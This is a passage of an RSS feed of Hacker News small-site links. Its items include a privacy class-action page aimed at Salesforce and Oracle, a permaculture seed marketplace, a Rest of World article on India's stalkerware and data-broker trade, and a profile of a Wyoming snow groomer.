            </description>
            <link>https://critter.blog/2020/12/23/2020-my-year-of-mantras/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518020</guid>
            <pubDate>Wed, 23 Dec 2020 14:42:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The privacy collective class action against Salesforce and Oracle]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25517961">thread link</a>) | @gingerlime
<br/>
December 23, 2020 | https://theprivacycollective.eu/en/ | <a href="https://web.archive.org/web/*/https://theprivacycollective.eu/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div id="main-content"><main><section><div><div><div><div><div><p>We're taking two tech corporations to court to stop them breaking the law, and to recover compensation for the wrongful harvesting and sharing of your personal data for profit. Click below if you believe that online privacy matters and to show support for the claim.</p><p>Your show of support will be counted once and be logged in accordance with our <a href="https://theprivacycollective.eu/en/privacy" target="_blank" rel="noreferrer">Privacy Policy</a>.</p></div></div></div></div><a title="Continue" href="https://theprivacycollective.eu/en/#whats-going-on"></a></div></section></main><div><div><div><p><h2>You've got nothing to hide, right?</h2></p></div></div><p>Your show of support will be counted once and be logged in accordance with our <a href="https://theprivacycollective.eu/en/privacy" target="_blank" rel="noreferrer">Privacy Policy</a>.</p><a title="Continue" href="https://theprivacycollective.eu/en/#our-mission"></a></div><div><div><div><div><div><h2>Our mission</h2><p>The Privacy Collective is dedicated to claiming compensation for the wrongful use of your personal data. We will do this through a class action, or 'collective action,' lawsuit on your behalf. The more support we have, the stronger our voice will be.</p><p>Everyone has the right to browse the web without being tracked. Your search history should not be for sale. Individually, you have no means of redress. There’s strength in numbers, and collectively we can get you what you’re owed.</p><p><strong>Click the button below so we can show the court there is broad support for the claims.</strong></p><p>Your show of support will be counted once and be logged in accordance with our <a href="https://theprivacycollective.eu/en/privacy" target="_blank" rel="noreferrer">Privacy Policy</a>.</p></div></div></div><div><div><h3>What happened?</h3><p>Oracle and Salesforce have been tracking the online behaviour of millions of people and wrongfully sharing personal details through the real-time bidding process.</p></div><div><h3>What we’re doing</h3><p>This claim is to stop Oracle and Salesforce from breaking the law and to recover compensation for people whose fundamental human right to privacy has been disregarded.</p></div><div><h3>Why we’re doing this</h3><p>These corporations are putting your profile on sale to the highest bidder. In doing so, you lose control of who has access to your information and how they are using it to influence how you think and act.</p></div></div></div><a title="Continue" href="https://theprivacycollective.eu/en/#our-allies"></a></div><div><div><div><p><h2>Our allies and contributors</h2></p></div></div><a title="Continue" href="https://theprivacycollective.eu/en/#why-privacy-matters"></a></div><div><div><div><div><div><div><p><img src="https://theprivacycollective.eu/en/privacy-matters/wp-content/uploads/2020/10/ania-IODC2016.jpg"></p></div><div><h3>Data privacy is a collective concern</h3><p>Ania Calderon, Executive Director of the Open Data Charter is working to democratise data. She explains why our online privacy matters so much.</p><p><a href="https://theprivacycollective.eu/en/privacy-matters/data-privacy-is-a-collective-concern-says-ania-calderon-from-the-open-data-charter">Read more</a></p></div></div></div><div><div><div><p><img src="https://theprivacycollective.eu/en/privacy-matters/wp-content/uploads/2020/10/MattMahmoudi.jpeg"></p></div><div><h3>Can we really call this a free society?</h3><p>Amnesty International’s Matt Mahmoudi says privacy is a community problem and the risks of decision making by algorithms cannot be ignored.</p><p><a href="https://theprivacycollective.eu/en/privacy-matters/an-interview-with-matt-mahmoudi">Read more</a></p></div></div></div><div><div><div><p><img src="https://theprivacycollective.eu/en/privacy-matters/wp-content/uploads/2020/09/Robin_Mansell_4213.jpeg.jpg"></p></div><div><h3>How do you decide who to trust with your data?</h3><p>Professor Robin Mansell, from the London School of Economics explains why protecting privacy online is so difficult, and what can be done about it.</p><p><a href="https://theprivacycollective.eu/en/privacy-matters/how-do-you-decide-who-to-trust-with-your-data-professor-robin-mansell-from-lse-on-why-protecting-privacy-online-is-so-difficult">Read more</a></p></div></div></div></div></div><p>Your show of support will be counted once and be logged in accordance with our <a href="https://theprivacycollective.eu/en/privacy" target="_blank" rel="noreferrer">Privacy Policy</a>.</p><a title="Continue" href="https://theprivacycollective.eu/en/#stay-informed"></a></div><div><div><div><div><div><p>– <!-- -->Larry Ellison, Co-founder, the Executive Chairman and Chief Technology Officer (CTO) of Oracle Corporation.</p></div></div></div></div></div><div><div><div><p>Please enter your details here if you wish to receive more information on our cases. This information will only be used for the purpose of progressing the claims.</p></div></div><a title="Top" href="https://theprivacycollective.eu/en/#top"></a></div></div></div></div></div>]]>
            </description>
            <link>https://theprivacycollective.eu/en/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517961</guid>
            <pubDate>Wed, 23 Dec 2020 14:35:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stroll – A Roam-like experience in a free, downloadable file]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25517912">thread link</a>) | @lemonspat
<br/>
December 23, 2020 | https://giffmex.org/stroll/stroll.html | <a href="https://web.archive.org/web/*/https://giffmex.org/stroll/stroll.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://giffmex.org/stroll/stroll.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517912</guid>
            <pubDate>Wed, 23 Dec 2020 14:28:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Marketplace for our regenerative post-capitalist future is up and running]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25517495">thread link</a>) | @roboben
<br/>
December 23, 2020 | https://permapeople.org/marketplace | <a href="https://web.archive.org/web/*/https://permapeople.org/marketplace">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    

    <section>

        

	    

        <table>
            <thead>
                <tr>
		            <th>Image</th>
                    <th>Item</th>
                    <th>Address</th>
                    <th>Price</th>
                    <th></th>
                </tr>
            </thead>

            <tbody>

                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/squash-seeds-musquee-de-provence-cucurbita-moschata">
                        <img src="https://cdn.permapeople.org/variants/du32hx2dt81vmcrqqe0zghbygkta/23d7b52d0b3c8647b0ce96c4c6f06ebc60197cc2b1cd19d4fa0928af5ccd9e5a" alt="Squash seeds &quot;MusquÃ©e de Provence&quot; (Cucurbita moschata)">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/squash-seeds-musquee-de-provence-cucurbita-moschata">Squash seeds "MusquÃ©e de Provence" (Cucurbita moschata)</a></td>
                    <td>Berlin, Germany</td>
                    <td>
		      1.00 â‚¬ EUR
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/squash-seeds-musquee-de-provence-cucurbita-moschata">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/squash-seeds-hokkaido-cucurbita-maxima">
                        <img src="https://cdn.permapeople.org/variants/yvim3os7ove32m5hsdw7d6hiv5fd/23d7b52d0b3c8647b0ce96c4c6f06ebc60197cc2b1cd19d4fa0928af5ccd9e5a" alt="Squash seeds 'Hokkaido' (Cucurbita maxima)">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/squash-seeds-hokkaido-cucurbita-maxima">Squash seeds 'Hokkaido' (Cucurbita maxima)</a></td>
                    <td>Berlin, Germany</td>
                    <td>
		      1.00 â‚¬ EUR
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/squash-seeds-hokkaido-cucurbita-maxima">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/tree-chili-seeds-rocoto-red-capsicum-pubescens">
                        <img src="https://cdn.permapeople.org/variants/n69gjvaq7yweak9nibkpl9um7wbz/23d7b52d0b3c8647b0ce96c4c6f06ebc60197cc2b1cd19d4fa0928af5ccd9e5a" alt="Tree Chili Seeds &quot;Rocoto Red&quot; (Capsicum pubescens)">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/tree-chili-seeds-rocoto-red-capsicum-pubescens">Tree Chili Seeds "Rocoto Red" (Capsicum pubescens)</a></td>
                    <td>Berlin, Germany</td>
                    <td>
		      1.99 â‚¬ EUR
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/tree-chili-seeds-rocoto-red-capsicum-pubescens">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/thai-butterfly-pea-double-blue">
                        <img src="https://permapeople.org/permapeople-permaculture-plant-database-blank.jpg" alt="Thai Butterfly Pea, Double Blue">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/thai-butterfly-pea-double-blue">Thai Butterfly Pea, Double Blue</a></td>
                    <td>Rock Hill, SC, USA</td>
                    <td>
		      3.00 $ USD
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/thai-butterfly-pea-double-blue">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/calendula-radio">
                        <img src="https://permapeople.org/permapeople-permaculture-plant-database-blank.jpg" alt="Calendula, Radio">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/calendula-radio">Calendula, Radio</a></td>
                    <td>Rock Hill, SC, USA</td>
                    <td>
		      3.00 $ USD
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/calendula-radio">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/myer-lemon">
                        <img src="https://permapeople.org/permapeople-permaculture-plant-database-blank.jpg" alt="Myer Lemon">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/myer-lemon">Myer Lemon</a></td>
                    <td>Rock Hill, SC, USA</td>
                    <td>
		      30.00 $ USD
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/myer-lemon">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/lemon-thyme">
                        <img src="https://permapeople.org/permapeople-permaculture-plant-database-blank.jpg" alt="Lemon Thyme">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/lemon-thyme">Lemon Thyme</a></td>
                    <td>Rock Hill, SC, USA</td>
                    <td>
		      3.00 $ USD
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/lemon-thyme">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/erica-arborea-tree-heath">
                        <img src="https://permapeople.org/permapeople-permaculture-plant-database-blank.jpg" alt="Erica Arborea - Tree Heath">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/erica-arborea-tree-heath">Erica Arborea - Tree Heath</a></td>
                    <td>Rock Hill, SC, USA</td>
                    <td>
		      30.00 $ USD
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/erica-arborea-tree-heath">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/lemons">
                        <img src="https://cdn.permapeople.org/variants/m0sitfklcj8rwpbd2yu69m72pudb/23d7b52d0b3c8647b0ce96c4c6f06ebc60197cc2b1cd19d4fa0928af5ccd9e5a" alt="Lemons">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/lemons">Lemons</a></td>
                    <td>Qiryat Ono, Israel</td>
                    <td>
		      1.50 $ USD
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/lemons">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/natural-vegan-soap-bars">
                        <img src="https://cdn.permapeople.org/variants/01whob162xwpwahr8lwa0ovojrjs/3fef1dc6f4ec20b6926b3d5f7057fae24c6ea38dc7215bbb81923d8e824034b4" alt="Natural Vegan Soap Bars">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/natural-vegan-soap-bars">Natural Vegan Soap Bars</a></td>
                    <td>Berlin, Germany</td>
                    <td>
		      16.00 â‚¬ EUR
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/natural-vegan-soap-bars">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/bird-s-eye-chili-thai-chili-seeds-capsicum-annuum">
                        <img src="https://cdn.permapeople.org/variants/cx1pzjo91u7ypyiv3mt18mrsbjzt/23d7b52d0b3c8647b0ce96c4c6f06ebc60197cc2b1cd19d4fa0928af5ccd9e5a" alt="Bird's Eye Chili / Thai Chili Seeds (Capsicum annuum)">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/bird-s-eye-chili-thai-chili-seeds-capsicum-annuum">Bird's Eye Chili / Thai Chili Seeds (Capsicum annuum)</a></td>
                    <td>Berlin, Germany</td>
                    <td>
		      2.00 â‚¬ EUR
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/bird-s-eye-chili-thai-chili-seeds-capsicum-annuum">View</a></td>
                </tr>
                <tr>
                    <td>
                    <a href="https://permapeople.org/marketplace/items/coriander-cilantro-seeds-coriandrum-sativum">
                        <img src="https://cdn.permapeople.org/variants/flhjkpi3rjv2f9g0rgbgtioflocf/23d7b52d0b3c8647b0ce96c4c6f06ebc60197cc2b1cd19d4fa0928af5ccd9e5a" alt="Coriander / Cilantro seeds (Coriandrum sativum)">
</a>                    </td>
                    <td><a href="https://permapeople.org/marketplace/items/coriander-cilantro-seeds-coriandrum-sativum">Coriander / Cilantro seeds (Coriandrum sativum)</a></td>
                    <td>Berlin, Germany</td>
                    <td>
		      1.00 â‚¬ EUR
		    </td>
                    <td><a href="https://permapeople.org/marketplace/items/coriander-cilantro-seeds-coriandrum-sativum">View</a></td>
                </tr>

            </tbody>
        </table>


	    



    </section>

</div></div>]]>
            </description>
            <link>https://permapeople.org/marketplace</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517495</guid>
            <pubDate>Wed, 23 Dec 2020 13:37:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India’s booming dark data economy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25517476">thread link</a>) | @CapitalistCartr
<br/>
December 23, 2020 | https://restofworld.org/2020/all-the-data-fit-to-sell/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/all-the-data-fit-to-sell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>A</span>yushi Sahu was ambushed. One evening in 2018, five months after her wedding, the 21-year-old college student was visiting her parents in the central Indian state of Chhattisgarh, when her husband showed up unannounced, his father and uncle in tow.</p>



<p>As the men settled in the living room, her husband said he had something he wanted them to hear. He took out his mobile phone and pressed “play.” The audio was loud and clear: private conversations between Sahu and her friends and family,<strong> </strong>which had been recorded without her permission. And it wasn’t only audio: “call logs, SMS, and WhatsApp messages, each photo and video, recordings of my video calls — he claimed to have accessed everything,” Sahu said. That was when she realized that her husband had, for months, been spying on her.</p>



<p>This was also how Sahu learned of certain things he had been holding against her. (Her name has been changed to protect against retaliation.) He had been offended to hear her complaining to her mother about problems with her in-laws. And he objected to her talking to a male friend. “He made a scene as if he was ‘exposing’ me,” Sahu recalled. “I was just sharing my concerns. That’s normal.”</p>



<p>Her husband played several more recordings, until his father eventually intervened. “I don’t want to listen to any more of this. You have heard it all? Okay, then,” he said, before reaching out to comfort Sahu, who was still in shock.</p>



<p>After processing the experience, Sahu decided she was willing to shrug it off, apologize, and move on, but her new husband continued to behave strangely. Eventually, she felt she had no choice but to end the marriage. “I don’t understand why he had to take this spying route,” she reflected. “He could have just asked. You know, in India, men can scold their wives, right? He could have done that. What was the need to go so deep into my phone and record my conversations?”</p>



<p>Sahu has no idea how her phone was bugged or for how long she was surveilled. But she has one clue: Her Vivo smartphone was an engagement gift from her husband.</p>



<p>It is likely that Sahu’s phone had off-the-shelf spyware on it. Her husband may have installed it himself or even consulted a private detective before marrying her, who provided him with the phone. In either case, he would have been part of a growing trend of individuals — often, jealous lovers — making use of personal surveillance technology.</p>



<p>According to Kunwar Vikram Singh, the chairman of the Association of Private Detectives and Investigators in India, it’s now common for wealthy families to assess the suitability of a potential bride or groom by hiring a private detective, a vetting that usually costs around $500. He attributes this to India’s changing social mores, especially among urban elites. “Work culture has changed. Values have changed,” Singh reflected, citing the influx of women into the workforce as one contributing factor. “We tell people, ‘You spend lakhs and crores on marital ceremonies; spend a few thousand on investigators’,” he said.</p>



<p>Whatever the reason, India’s private-detective services have been growing over the past decade. Singh estimates that the sector is now worth roughly $1.2 billion<strong> </strong>nationally. But because of the sensitive nature of the field, it’s impossible to know for sure: There are no official statistics, and many clients still pay in cash. “They don’t want to leave any footprint,” he noted.</p>



<p>The services offered by the detectives mainly fall into two categories: corporate and personal. The corporate investigations often involve banks hiring investigators to get information on shifty borrowers and financial firms looking for background checks on employees. The personal services range from child monitoring to matrimonial background checks. Every agency has its own specialization. Karnam Choudhary, a Jaipur-based detective who operates the Siyol Detective Network, which has around 1,500 freelance private investigators across the country, says that “since 2016, personal cases make up almost 70%.”</p>



<p>The boom in business has coincided with a growing reliance on consumer-grade spyware. These are mostly smartphone apps that cannot easily be detected, secretly record all of a device’s activity, and route that data to a third-party dashboard. A private investigator’s first move used to be shadowing somebody in person; today, many of them begin by advising the client to present the object of their suspicion with a malware-infected smartphone.</p>



<p>Growing demand for spyware first caught the attention of India’s software engineers several years ago, long before the coronavirus pandemic led to a spike. In 2013, while researching viruses and cybersecurity for his final-year engineering project, Gujarat-based coder Tushar Mepani began meeting parents who wanted to keep closer tabs on their teenagers’ whereabouts. “I could not sleep at night when these millionaires told me about their kids’ behavior,” he said, apparently in earnest. The initial prototype of <a href="http://www.convants.com/">what became his first app for tracking children</a>, EasySpyPhone, was restricted to recording calls and collecting text messages and location data, but more recent iterations can spy on social media platforms like Facebook and WhatsApp, secretly turn on a phone’s microphone to record calls and video, and capture screenshots, all for around $20 or $40 per month. “Parents were very happy,” Mepani reflected. “They learned who their kids are friends with — and who is diverting them. The app has saved kids from being spoiled.”</p>



<figure><blockquote><p>“We had no idea at the time whether people would be interested in this, but it clicked with users.”</p></blockquote></figure>



<p>Mepani doesn’t sell only one or two products, however; through his Android spyware company, Convants Information Security, he licenses surveillance software to multiple vendors, who repackage it under different names. He won’t reveal the details of these arrangements, calling them “internal business,” but he claims to have made more than 20,000 sales. In 2014, Choudhary, the Jaipur-based detective, used Mepani’s software to launch his <a href="http://spymobileprocess.com/">agency’s own app, Spy Mobile Process</a>. Instead of paying for a full investigation, those who buy Choudhary’s app may use it to conduct their own inquiries, with guidance from detectives. “We had no idea at the time whether people would be interested in this,” he said. “But it clicked with users.”</p>



<p>All of this exists in a legal gray area. As of now, there are no laws in India regulating the selling or purchasing of so-called stalkerware. Nor is there much clarity about the privacy laws currently on the books. In India, it is not illegal to physically surveil a target, for instance, but things get fuzzier when it comes to tracking somebody’s location via mobile phone. Courts have been forced to establish statutes, case by case. In 2018, for instance, a family court in Delhi <a href="https://theprint.in/judiciary/evidence-collected-in-breach-of-privacy-does-not-make-it-inadmissible-in-court-delhi-hc/452288/">admitted evidence collected from spyware</a> in a case concerning a marital dispute, stating that the right to a fair trial outweighed privacy protections.</p>



<p>But staying on the right side of the law doesn’t seem to trouble many spyware vendors. Insofar as they are concerned about legal exposure, most will simply add disclaimers that place the onus on the user. Before installing software, the customer should get “proper written consent to do so by the owner of the smartphone” and understand that it is the “responsibility of the buyer to obey all laws of their country.”</p>



<p>In August 2020, Google introduced a new Ads Policy imposing restrictions on advertising for spyware and surveillance technology. “The updated policy will prohibit the promotion of products or services that are marketed or targeted with the express purpose of tracking or monitoring another person or their activities without their authorization,” the company wrote in its updated policy. However, Google made two exceptions: “private investigation services,” like Choudhary’s, and “products or services designed for parents to track or monitor their underage children,” like Mepani’s.</p>



<p>Private detectives who admit to using spyware almost universally insist that any problems stemming from it are the result of abuse. But what they say publicly is one thing, and how they market their services is another. While Choudhary claims his app is not intended for spying on spouses, a <a href="https://twitter.com/Siyol007/status/670517689576726528?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed&amp;ref_url=notion%3A%2F%2Fwww.notion.so%2FSahil-Chajotra-JK-detectives-0f27a3d4a117474eac2b15f591b5d764">November 2015 tweet</a> from his company’s official account said just the opposite. In a series of phone interviews, Mepani also denied marketing his product to jealous husbands and wives, even as his website made clear that these are target demographics. “But you know,” he added, “it is like a knife. You can cut fruits, or you can cut someone’s head.”</p>



<p>However unsettling, the spyware sector is only one small part of a much vaster infrastructure. More than 500 million people in India use the internet every month, creating troves of private information with every click, scroll, swipe, and download. What they watch, how they date, whom they work for, and where they spend their money is constantly being captured and monetized. All this has given rise to a multimillion-dollar dark data economy, in which no piece of information is too personal to trade.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-40x18.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-400x177.png 400w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-600x265.png 600w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-1000x442.png 1000w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-1600x708.png 1600w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>The black market</strong> for data, as it exists online in India, resembles those for wholesale vegetables or smuggled goods. Customers are encouraged to buy in bulk, and the variety of what’s on offer is mind-boggling: There are databases about parents, cable customers, pregnant women, pizza eaters, mutual funds investors, and almost any niche group one can imagine. A typical database consists of a spreadsheet with row after row of names and key details: Sheila Gupta, 35, lives in Kolkata, runs a travel agency, and owns a BMW; Irfaan Khan, 52, lives in Greater Noida, and has a son who just applied to engineering college. The databases are usually updated every three months (the older one is, the less it is worth), and if you buy several at the same time, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/all-the-data-fit-to-sell/">https://restofworld.org/2020/all-the-data-fit-to-sell/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/all-the-data-fit-to-sell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517476</guid>
            <pubDate>Wed, 23 Dec 2020 13:35:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mountain Smoother]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25517389">thread link</a>) | @CapitalistCartr
<br/>
December 23, 2020 | https://beside.media/besiders/the-mountain-smoother/ | <a href="https://web.archive.org/web/*/https://beside.media/besiders/the-mountain-smoother/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        <div>
          
          
                      <p>Taming the trails of Medicine Bow National Forest, the work of the snow groomers often goes unnoticed. We shed light on the nocturnal labours of Tim Bishop.
</p>
          
                      <p>Text—Emmalyne Beck<br>
Photos—Mike Penn</p>
                            </div>
      </div><div>
        <section>
                                                


      

                  <p>As the sun sets, Tim Bishop walks out the front door of his lodge in his trusted flannel work shirt and worn-in snow boots. On frigid nights, he wears thermals under his jeans. Surrounded by the Snowy Range mountains, Bishop carries a warm dinner made by his wife, a Thermos of hot coffee, and water and snacks to last him through the night. One of his two Australian shepherds follows him through the snow to the Tucker Sno-Cat as he embarks on his long night on the trails.</p>
      

            
    
      

            
      <div>
        <figure>
                      <img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomers_DSC2847-1024x683.jpg" alt="">
                            </figure>
       </div>

              
    
      

            
                          

        
                                
          <div>

            <p>“When I’m out there, and the moon is up, it’s just gorgeous. […] I’m out there by myself, and I’m at home.”</p>
                        </div>
        
      
    
      

                  <p><span>Bishop works as a snow groomer five nights a week during the depths of Wyoming winters, typically from December through March. He is one of three snow groomers in Medicine Bow, Wyoming. Each night of the week they groom the hundreds of miles of trails in Medicine Bow National Forest from sundown until the wee hours of the morning.</span></p>
      

            
    
      

            
        

      
    
      

                  <div>
        <p><span>Tourism is the second-largest industry in Wyoming, and snowmobiling is a significant attraction. Snowmobilers purchase permits from the state each year to sled Medicine Bow National Forest’s trails. After a full day of </span><span>snowmobiles passing over them</span><span>, the trails become rough and require smoothing for the safety and enjoyment of the sledders. Bishop says the state needed someone who lived in the area, was familiar with Medicine Bow National Forest, and could operate big pieces of machinery to work the trails.</span></p>
<p><span>“The snowmobilers want a nice trail to go down,” Bishop says. “I will groom, and the snow will be hard. If I don’t groom it, the snow will get these big ruts, and nobody wants to go down them. It’s more dangerous, it tears the snowmobile up, and it is not as enjoyable.”</span></p>

      </div>
      

            
    
      

            
      <div>
        <figure>
          <div>
            <p><img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomer_DSC2842.jpg" alt="">
                        </p>
          </div>
        </figure>
      </div>

      
    
      

                  <p>The snow groomer looms over the icy landscape with its six-metre frame, including a 1.2 m pan and a heated cab. The machine creates an even surface through a process of warming and moving the snow, with the pan smoothing it out at the end. Precariously teetering along narrow strips of land with cliffs on either side requires a balance of artistry and surgical precision. Bishop fluidly manoeuvres the 3.6 m blades across the wild topography, despite the laborious task.</p>
      

            
    
      

            
      <div>
        <figure>
                      <img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomer_DSC2885-1024x683.jpg" alt="">
                            </figure>
       </div>

              
    
      

            
                          

        
                                
          <div>

            <p>“In some parts of the trail, you can’t go more than four to five miles [six to eight kilometres] an hour,” Bishop says. The longest trail Bishop grooms is 132 km, and takes him 10 to 14 hours to complete.</p>
                        </div>
        
      
    
      

                  <div>
        <p><span>To become a groomer, Bishop enrolled in a week-long intensive training to learn the basics of the craft. However, like all arts, snow grooming is best learned through practice. Bishop has perfected his approach over the last two years, continuing to learn various nuances of the job.</span></p>
<p><span>“I know the trails,” Bishop says. “It was just a matter of learning to drive the groomer.”</span></p>
<p><span>Even though Bishop knows the terrain intimately, snow grooming can be dangerous. Furious blizzards, whiteouts, 120 km/h winds, and temperatures dropping to -30 </span><b>°</b><span>C are all commonplace on the trails. Bishop says the nights can test your steel as you drive over frozen rivers with water flowing beneath the ice, stare into the green eyes of a stubborn moose, or see mountain lions shred a deer to pieces.</span></p>

      </div>
      

            
    
      

            
      <div>
        <figure>
          <div>
            <p><img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomer_DSC2802.jpg" alt="">
                        </p>
          </div>
        </figure>
      </div>

      
    
      

                  <div>
        <p>“If you break down, you spend the night or you walk out,” Bishop says. “Normally, you don’t want to leave the snowcat because if you turn it off, you may not get it cranked again up there.”</p>
<p>Bishop says the trails also need to be maintained for search and rescue purposes: “If we don’t have trails groomed to get to those places that people get hurt, we can’t get to them.” While he isn’t on the search and rescue team himself, Bishop says he has pulled a stuck vehicle out of a snowbank and picked up stranded snowmobilers and brought them to safety.</p>

      </div>
      

            
    
      

            
      <div>
        <figure>
                      <img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomer_DSC2944-1024x683.jpg" alt="">
                            </figure>
       </div>

              
    
      

            
      <div>
        <figure>
                      <img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomer_DSC2954-1024x683.jpg" alt="">
                            </figure>
       </div>

              
    
      

            
                          

        
                                
          <div>

            <p>The nights when Bishop is bathed in the luminous glow of the moon and stars are his favourites. On top of the mental exercise of navigating the snow groomer through the unmarked trails, he listens to audiobooks to pass the time.</p>
                        </div>
        
      
    
      

                  <div>
        <p>“I learn a lot while I’m up there,” he says.</p>
<p>While the solitary work can be lonely, Bishop is never truly alone. Each night he alternates bringing one of his dogs, Roper and Magnum, leaving the other with his wife at their lodge. This ride-along tradition was actually not originally Bishop’s idea. The first time he went grooming, Roper and Magnum trailed their owner across the frozen landscape.</p>
<p>“I just happened to be turning around and found them [the dogs]. I didn’t know they were following me. They went 50 km before I picked them up. If I hadn’t found them where I did, they would have had to go 100 km,” Bishop says, laughing. “They were so sore; they could hardly walk the next day. They are much happier in the cab.”</p>

      </div>
      

            
    
      

            
      <div>
        <figure>
                      <img src="https://content.beside.media/beside_/app/www/2020/11/BESIDE_Besiders_SnowGroomer_DSC2880-1024x683.jpg" alt="">
                            </figure>
       </div>

              
    
      

                  <div>
        <p><span>Bishop and his wife Debbie have lived in Medicine Bow for 18 years. They run Medicine Bow Lodge &amp; Adventure Guest Ranch, which accepts visitors during the spring, summer, and fall. As Bishop prepares his lodges for the winter, he gears up to groom the trails. Bishop says he enjoys the peace of the winter after a busy guest season.</span></p>
<p><span>“In the summer, I’m with people from 6 o’clock in the morning to 8 or 9 o’clock at night, seven days a week, from the end of May to the end of October,” he says. “In the winter, it’s a nice break. I’m not with people. It’s quiet. I can think. I can listen to books. It’s a whole different experience for me.”</span></p>

      </div>
      

            
    
      

                    <div>
          <p><strong>Emmalyne Beck </strong>is passionate about writing the stories of those often disregarded. She believes that the greatest honour is to hear the stories of others. A native of the southeastern United States, she delights in digesting alluring words, experiencing new cultures, marvelling at nature, listening to bountiful rain, and basking in the gift of community.</p>
        </div>

            
                
        </section>
      </div></div>]]>
            </description>
            <link>https://beside.media/besiders/the-mountain-smoother/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25517389</guid>
